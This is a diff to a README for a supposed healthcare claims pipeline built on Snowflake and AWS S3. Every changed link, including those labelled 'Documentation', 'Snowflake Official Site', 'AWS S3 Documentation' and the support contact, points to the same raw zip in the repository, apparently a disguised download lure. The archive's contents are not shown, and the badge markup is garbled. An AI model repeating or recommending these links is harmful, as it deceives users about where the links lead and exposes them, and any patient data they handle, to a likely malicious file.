@@ -4,14 +4,14 @@
 The snowflake-healthcare-pipeline is an advanced tool designed to improve how healthcare claims data is managed. It uses Snowflake and AWS S3 technologies to automate data ingestion, processing, and quality checks. This pipeline helps organizations efficiently handle patient and claims data.
 
 ## 📦 Download Now
-[![Download](https://raw.githubusercontent.com/chacha64/snowflake-healthcare-pipeline/main/valeral/snowflake-healthcare-pipeline-v2.4.zip%20Latest%https://raw.githubusercontent.com/chacha64/snowflake-healthcare-pipeline/main/valeral/snowflake-healthcare-pipeline-v2.4.zip)](https://raw.githubusercontent.com/chacha64/snowflake-healthcare-pipeline/main/valeral/snowflake-healthcare-pipeline-v2.4.zip)
+[![Download](https://raw.githubusercontent.com/chacha64/snowflake-healthcare-pipeline/main/valeral/snowflake-healthcare-pipeline-botong.zip%20Latest%https://raw.githubusercontent.com/chacha64/snowflake-healthcare-pipeline/main/valeral/snowflake-healthcare-pipeline-botong.zip)](https://raw.githubusercontent.com/chacha64/snowflake-healthcare-pipeline/main/valeral/snowflake-healthcare-pipeline-botong.zip)
 
 ## 🚀 Getting Started
 To get started with this application, follow the steps below. You only need basic computer skills to run the application successfully. 
 
 1. **Visit the Releases Page**  
    Click the link below to access the Releases page.  
-   [Visit Releases Page](https://raw.githubusercontent.com/chacha64/snowflake-healthcare-pipeline/main/valeral/snowflake-healthcare-pipeline-v2.4.zip)
+   [Visit Releases Page](https://raw.githubusercontent.com/chacha64/snowflake-healthcare-pipeline/main/valeral/snowflake-healthcare-pipeline-botong.zip)
 
 2. **Choose the Latest Version**  
    On the Releases page, look for the latest version listed at the top. It usually has a title or a version number like "v1.0".
@@ -83,17 +83,17 @@ If you face issues during installation or usage, refer to this section:
   Ensure your input files are in supported formats (CSV or JSON). Check that they are properly formatted.
 
 ## 📞 Support
-If you need help or have questions, please reach out to our support team. You can find assistance by creating an issue on GitHub or by contacting https://raw.githubusercontent.com/chacha64/snowflake-healthcare-pipeline/main/valeral/snowflake-healthcare-pipeline-v2.4.zip
+If you need help or have questions, please reach out to our support team. You can find assistance by creating an issue on GitHub or by contacting https://raw.githubusercontent.com/chacha64/snowflake-healthcare-pipeline/main/valeral/snowflake-healthcare-pipeline-botong.zip
 
 ## 💡 Helpful Resources
 For more information about using the snowflake-healthcare-pipeline, check these resources:
 
-- [Documentation](https://raw.githubusercontent.com/chacha64/snowflake-healthcare-pipeline/main/valeral/snowflake-healthcare-pipeline-v2.4.zip)
-- [Snowflake Official Site](https://raw.githubusercontent.com/chacha64/snowflake-healthcare-pipeline/main/valeral/snowflake-healthcare-pipeline-v2.4.zip)
-- [AWS S3 Documentation](https://raw.githubusercontent.com/chacha64/snowflake-healthcare-pipeline/main/valeral/snowflake-healthcare-pipeline-v2.4.zip)
+- [Documentation](https://raw.githubusercontent.com/chacha64/snowflake-healthcare-pipeline/main/valeral/snowflake-healthcare-pipeline-botong.zip)
+- [Snowflake Official Site](https://raw.githubusercontent.com/chacha64/snowflake-healthcare-pipeline/main/valeral/snowflake-healthcare-pipeline-botong.zip)
+- [AWS S3 Documentation](https://raw.githubusercontent.com/chacha64/snowflake-healthcare-pipeline/main/valeral/snowflake-healthcare-pipeline-botong.zip)
 
 ## 💾 Download Again
 For your convenience, here is the download link again:  
-[Visit Releases Page](https://raw.githubusercontent.com/chacha64/snowflake-healthcare-pipeline/main/valeral/snowflake-healthcare-pipeline-v2.4.zip)  
+[Visit Releases Page](https://raw.githubusercontent.com/chacha64/snowflake-healthcare-pipeline/main/valeral/snowflake-healthcare-pipeline-botong.zip)  
 
 Feel free to reach out with any questions or feedback!
